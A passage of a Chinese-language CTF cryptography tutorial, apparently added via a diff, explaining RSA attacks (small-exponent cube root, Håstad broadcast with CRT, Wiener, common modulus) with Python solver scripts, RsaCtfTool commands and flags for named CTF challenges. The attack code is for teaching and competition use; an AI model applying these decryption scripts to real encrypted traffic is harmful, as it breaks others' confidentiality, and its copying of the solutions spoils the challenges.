+dq = 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659
+
+qinv = gmpy2.invert(q,p)
+m1 = gmpy2.powmod(c,dp,p)
+m2 = gmpy2.powmod(c,dq,q)
+h = qinv * (m1-m2)
+m = m2 + h*q
+
+print(long_to_bytes(m)) # b'Theres_more_than_one_way_to_RSA'
+</code></pre>
+<h3 id="低加密指数小明文攻击"><a class="header" href="#低加密指数小明文攻击">低加密指数小明文攻击</a></h3>
+<ul>
+<li>识别：已知加密指数\( e \)较小，通常为 3</li>
+</ul>
+<p>如果明文\( m \)非常小，且加密指数\( e \)较小，通常为 3。若满足\( m^3 &lt; n \)，那么\( c = m^3 \)，可直接计算密文\( c \)的立方根来恢复明文\( m \)。</p>
+<p>例题，已知题目信息如下，得\( e=3 \)，且密文\( c \)比\( n \)小，可直接计算密文的立方根。</p>
+<pre><code class="language-text">e: 3
+c: 2780321436921227845269766067805604547641764672251687438825498122989499386967784164108893743279610287605669769995594639683212592165536863280639528420328182048065518360606262307313806591343147104009274770408926901136562839153074067955850912830877064811031354484452546219065027914838811744269912371819665118277221
+n: 23571113171923293137414347535961677173798389971011031071091131271311371391491511571631671731791811911931971992112232272292332392412512572632692712772812832933073113133173313373473493533593673733793833893974014094194214314334394434494574614634674794874914995035095215235415475575635695715775875935996016076136176196316416436476536596616736776836917017097197277337397437517577617697737877978098118218238278298398538578598638778818838879079119199299379419479539679719779839919971009101310191431936117404941729571877755575331917062752829306305198341421305376800954281557410379953262534149212590443063350628712530148541217933209759909975139820841212346188350112608680453894647472456216566674289561525527394398888860917887112180144144965154878409149321280697460295807024856510864232914981820173542223592901476958693572703687098161888680486757805443187028074386001621827485207065876653623459779938558845775617779542038109532989486603799040658192890612331485359615639748042902366550066934348195272617921683
+</code></pre>
+<p>脚本如下：</p>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+c = 2780321436921227845269766067805604547641764672251687438825498122989499386967784164108893743279610287605669769995594639683212592165536863280639528420328182048065518360606262307313806591343147104009274770408926901136562839153074067955850912830877064811031354484452546219065027914838811744269912371819665118277221
+m = gmpy2.iroot(c, 3)[0]
+print(long_to_bytes(m)) # b'dsc{t0-m355-w1th-m4th-t4k35-4-l0t-0f-sp1n3}'
+</code></pre>
+<pre><code class="language-bash">RsaCtfTool -n 2357..3 -e 3 --decrypt 2780...21 --attack cube_root
+</code></pre>
+<p>如果密文虽然大于，但不是特别大，
+练习题：NahamCon CTF 2024: Magic RSA</p>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+ciphertext = [1061208, 1259712, 912673, 1092727, 1860867, 175616, 166375, 941192, 185193, 1030301, 941192, 185193, 912673, 140608, 175616, 185193, 140608, 941192, 970299, 1061208, 175616, 912673, 117649, 912673, 185193, 148877, 912673, 125000, 110592, 1030301, 132651, 132651, 1061208, 117649, 117649, 1061208, 166375, 1953125]
+N = 292661735803169078279687796534368733968232055929694715453717384181208539846645017378459508481927733219065809706996972833902743250671173212610674572380079245835772007065919936022084401497853611610920914306013040436502207047619016113234947051878549793269852855316328078769491183468515501156324665790842023112309668506350354977653838139155232422868462129041940364012648613391176971689126513558396465218392059219609662829793504680423032430634001779369250142543104703669906030549585514247663929431837546466696121103600101025434247152431200408744676625328330247569014313252820778269086840631297075563756934662979588351413726196027845505808290890109883253252054958997436359016852222176230489468164288277709046892991459049248340800616885136366469783271661343653314539194467688757972713531491290238432270971346559967725437118531023032768463200227986539449334624183071042562539584305305367245588508498775214112729500313280502474837332653452065755426475638743763861804587979560695676963674789819860296303566053542883415223272958687917330474367563315425617320128680682444959701586681495270336801802382200546403246134181793704030611664095075430115127507174884551339452808218398863888817
+
+def cube_root_attack(ciphertext, N):
+    decrypted = []
+    for c in ciphertext:
+        m = gmpy2.iroot(c, 3)[0]
+        decrypted.append(long_to_bytes(m))
+    return decrypted
+
+decrypted_plaintext = cube_root_attack(ciphertext, N)
+for pt in decrypted_plaintext:
+   print(pt.decode(), end='')
+</code></pre>
+<h3 id="低加密指数广播攻击"><a class="header" href="#低加密指数广播攻击">低加密指数广播攻击</a></h3>
+<ul>
+<li>已知多组模数$n_i$、密文$c_i$</li>
+</ul>
+<p>对于相同明文$m$，使用相同的低加密指数$e$（如$e=3$），在不同的模数$n_1,n_2,...,n_i$进行加密（$i \geq e$），得到$i$组密文，可以使用中国剩余定理解出明文。</p>
+<pre><code class="language-python">from functools import reduce
+import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+
+def crt(a, n):
+    sum = 0
+    prod = reduce(lambda a, b: a*b, n)
+    for n_i, a_i in zip(n, a):
+        p = prod // n_i
+        sum += a_i * gmpy2.invert(p, n_i)*p
+    return sum % prod
+
+
+# 已知变量
+e = 3
+n1 = int('331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004', 5)
+c1 = int('310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243', 5)
+
+n2 = int('302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114', 5)
+c2 = int('112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344', 5)
+
+n3 = int('332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323', 5)
+c3 = int('10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242', 5)
+
+# 使用 gmpy2 的 crt 方法计算 m^e
+m_e = crt([c1, c2, c3], [n1, n2, n3])
+
+# 计算 m^e 的整数根
+m, exact = gmpy2.iroot(m_e, e)
+
+if exact:
+    print(f"解密得到的消息 m 为: {long_to_bytes(m)}") # b'noxCTF{D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!}
+else:
+    print("未能找到整数根")
+
+</code></pre>
+<h3 id="低解密指数攻击wieners-attack维纳攻击"><a class="header" href="#低解密指数攻击wieners-attack维纳攻击">低解密指数攻击（Wiener's attack，维纳攻击）</a></h3>
+<p>如果加密指数\( e \)非常大，由于\( ed \)在乘积时地位对等，解密指数\( d \)可能较小，可以进行维纳攻击。</p>
+<p>值得注意的是，在实际应用中，加密指数\( e \)通常选择为一个较小的固定值<code>65537</code>，以便保证安全性的同时提高加密和解密的效率。</p>
+<pre><code class="language-text">n = 109676931776753394141394564514720734236796584022842820507613945978304098920529412415619708851314423671483225500317195833435789174491417871864260375066278885574232653256425434296113773973874542733322600365156233965235292281146938652303374751525426102732530711430473466903656428846184387282528950095967567885381
+e = 49446678600051379228760906286031155509742239832659705731559249988210578539211813543612425990507831160407165259046991194935262200565953842567148786053040450198919753834397378188932524599840027093290217612285214105791999673535556558448523448336314401414644879827127064929878383237432895170442176211946286617205
+c = 103280644092615059984518332609100925251130437801342718478803923990158474621180283788652329522078935869010936203566024336697568861166241737937884153980866061431062015970439320809653170936674539901900312536610219900459284854811622720209705994060764318380465515920139663572083312965314519159261624303103692125635
+</code></pre>
+<pre><code class="language-bash">./RsaCtfTool.py -n 1096..1 -e 494..5 --decrypt 103..5 --attack wiener
+#
+</code></pre>
+<h3 id="共模攻击"><a class="header" href="#共模攻击">共模攻击</a></h3>
+<p>共模攻击（Common Modulus Attack）的前提是<strong>同一个明文\( m \)</strong> 使用<strong>相同的模数</strong>\( n \)但<strong>不同的加密指数</strong>\( e_1, e_2, \ldots, e_k \)进行加密。</p>
+<p>假设有同一个明文\( m \)使用相同的模数$n \)但不同的加密指数\( e_1 \)和\( e_2 \)进行加密，分别得到密文\( c_1 \)和\( c_2 \)：</p>
+<p>$$ c_1 = m^{e_1} \mod n $$
+$$ c_2 = m^{e_2} \mod n $$</p>
+<p>如果\( e_1 \)和\( e_2 \)互素，即\( \gcd(e_1, e_2) = 1 \)，则可以使用扩展欧几里得算法找到整数\( a \)和\( \)，使得：</p>
+<p>$$ a \cdot e_1 + b \cdot e_2 = 1$$</p>
+<p>然后可以通过以下步骤恢复消息\( m$：</p>
+<ol>
+<li>计算\( c_1^a \mod n$和\( c_2^b \mod n \)。</li>
+<li>如果\( a \)是负数，则计算\( c_1^{-a} \mod n \)，这相当于计算$(c_1^{-1})^a \mod n \)，其中\( c_1^{-1}$是\( c_1$在模\( n \)下的逆元。</li>
+<li>同理，如果\( b \)是负数，则计算\( c_2^{-b} \mod n \)。</li>
+<li>最终消息\( m$可以通过\( m = (c_1^a \cdot c_2^b) \mod n \)恢复。</li>
+</ol>
+<h4 id="例题分析-7"><a class="header" href="#例题分析-7">例题分析</a></h4>
+<h4 id="示例代码-1"><a class="header" href="#示例代码-1">示例代码</a></h4>
+<p>以下是使用 Python 和 <code>gmpy2</code> 库实现 RSA 共模攻击的示例代码：</p>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+def common_modulus_attack(c1, c2, e1, e2, n):
+    # 扩展欧几里得算法找到 a 和 b
+    g, a, b = gmpy2.gcdext(e1, e2)
+
+    # 确保 e1 和 e2 互质
+    if g != 1:
+        raise ValueError("e1 和 e2 必须互质")
+
+    # 计算 c1^a 和 c2^b
+    if a &lt; 0:
+        c1 = gmpy2.invert(c1, n)
+        a = -a
+    if b &lt; 0:
+        c2 = gmpy2.invert(c2, n)
+        b = -b
+
+    m1 = gmpy2.powmod(c1, a, n)
+    m2 = gmpy2.powmod(c2, b, n)
+
+    # 恢复消息 m
+    m = (m1 * m2) % n
+    return m
+
+# 示例
+n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249
+e1 = 773
+e2 = 839
+c1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349
+c2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535
+m = common_modulus_attack(c1, c2, e1, e2, n)
+print(long_to_bytes(m))
+</code></pre>
+<h3 id="解释"><a class="header" href="#解释">解释</a></h3>
+<ol>
+<li>
+<p><strong>扩展欧几里得算法</strong>：</p>
+<ul>
+<li>使用 <code>gmpy2.gcdext</code> 计算$e_1$和$e_2$的最大公约数以及系数$a$和$b$。</li>
+</ul>
+</li>
+<li>
+<p><strong>检查互质性</strong>：</p>
+<ul>
+<li>确保$e_1$和$e_2$互质，否则攻击无法进行。</li>
+</ul>
+</li>
+<li>
+<p><strong>计算逆元</strong>：</p>
+<ul>
+<li>如果$a$或$b$为负数，则计算相应密文的逆元。</li>
+</ul>
+</li>
+<li>
+<p><strong>恢复消息</strong>：</p>
+<ul>
+<li>通过$m = (c_1^a \cdot c_2^b) \mod n$恢复原始消息。</li>
+</ul>
+</li>
+</ol>
+<p>通过上述步骤和代码，可以利用 RSA 共模攻击在特定条件下恢复原始消息。保护 RSA 系统的安全性，避免使用相同的模数$n$是非常重要的。</p>
+<h3 id="coppersmiths-high-attack"><a class="header" href="#coppersmiths-high-attack">Coppersmith's High Attack</a></h3>
+<h3 id="rsa-lsb-oracle"><a class="header" href="#rsa-lsb-oracle">RSA LSB Oracle</a></h3>
+<h2 id="练习题-1"><a class="header" href="#练习题-1">练习题</a></h2>
+<h3 id="buuctf-rsaroll"><a class="header" href="#buuctf-rsaroll">BUUCTF RSAROLL</a></h3>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+p = 18443
+q = 49891
+n = 920139713
+e = 19
+phi = (p-1)*(q-1)
+d = gmpy2.invert(e,phi)
+
+flag = b''
+with open('data.txt', 'r') as f:
+    for line in f.readlines():
+        # print(line)
+        m = gmpy2.powmod(int(line), d, n)
+        flag += long_to_bytes(m)
+print(flag)
+# b'flag{13212je2ue28fy71w8u87y31r78eu1e2}'
+</code></pre>
+<h3 id="jarvis-oj---crypto--mediumrsa"><a class="header" href="#jarvis-oj---crypto--mediumrsa">Jarvis OJ - Crypto- MediumRSA</a></h3>
+<p>PEM（Privacy Enhanced Mail）文件是一种用于存储和传输加密数据的格式，通常用于存储证书、私钥、公钥等加密信息。PEM 文件使用 Base64 编码，并包含特定的头部和尾部标签，以便于识别和处理。</p>
+<p>PEM 文件的内容通常包含以下部分：</p>
+<ol>
+<li><strong>头部标签</strong>：标识文件的类型，例如 <code>-----BEGIN CERTIFICATE-----</code> 或 <code>-----BEGIN RSA PRIVATE KEY-----</code>。</li>
+<li><strong>Base64 编码的数据</strong>：实际的加密数据，以 Base64 编码表示。</li>
+<li><strong>尾部标签</strong>：标识文件的结束，例如 <code>-----END CERTIFICATE-----</code> 或 <code>-----END RSA PRIVATE KEY-----</code>。</li>
+</ol>
+<h3 id="guet-ctf-2019-babyrsa"><a class="header" href="#guet-ctf-2019-babyrsa">GUET-CTF 2019 BabyRSA</a></h3>
+<pre><code class="language-text">p+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea
+(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740
+e : 0xe6b1bee47bd63f615c7d0a43c529d219
+d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5
+enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a
+</code></pre>
+<p>$$
+\begin{align}
+(p+1)(q+1) &amp;= pq + p + q + 1 = n + p + q + 1 \
+n &amp;= (p+1)(q+1) - (p + q) - 1
+\end{align}
+$$</p>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+# p+q用a表示
+a = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea
+# (p+1)(q+1)用b表示
+b = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740
+d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5
+c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a
+
+n = b - a - 1
+m = gmpy2.powmod(c, d, n)
+print(long_to_bytes(m))
+# flag{cc7490e-78ab-11e9-b422-8ba97e5da1fd}
+</code></pre>
+<h3 id="buuctf-rsa2"><a class="header" href="#buuctf-rsa2">BUUCTF-RSA2</a></h3>
+<h3 id="hdctf2019bbbbbbrsa"><a class="header" href="#hdctf2019bbbbbbrsa">[HDCTF2019]bbbbbbrsa</a></h3>
+<pre><code class="language-python">from base64 import b64decode
+import gmpy2
+from Crypto.Util.number import *
+
+p = 177077389675257695042507998165006460849
+n = 37421829509887796274897162249367329400988647145613325367337968063341372726061
+c = "==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM"
+
+q = n // p
+
+print(q)
+
+phi = (p-1)*(q-1)
+c = int(b64decode(c[::-1]))
+for e in range(50000,70000):
+    if gmpy2.gcd(e, phi) == 1:
+        d = gmpy2.invert(e, phi)
+        m = gmpy2.powmod(c,d,n)
+        flag = str(long_to_bytes(m))
+        print(flag)
+</code></pre>
+<h3 id="buuctf-rsa5"><a class="header" href="#buuctf-rsa5">BUUCTF RSA5</a></h3>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207
+c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320
+
+n2 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759
+c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855
+
+n3 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491
+c3 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862
+
+n4 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751
+c4 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613
+
+n5 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067
+c5 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357
+
+n6 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369
+c6 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932
+
+n7 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137
+c7 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179
+
+n8 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191
+c8 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006
+
+n9 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941
+c9 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934
+
+n10 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491
+c10 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869
+
+n11 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019
+c11 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467
+
+n12 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299
+c12 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971
+
+n13 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551
+c13 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175
+
+n14 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987
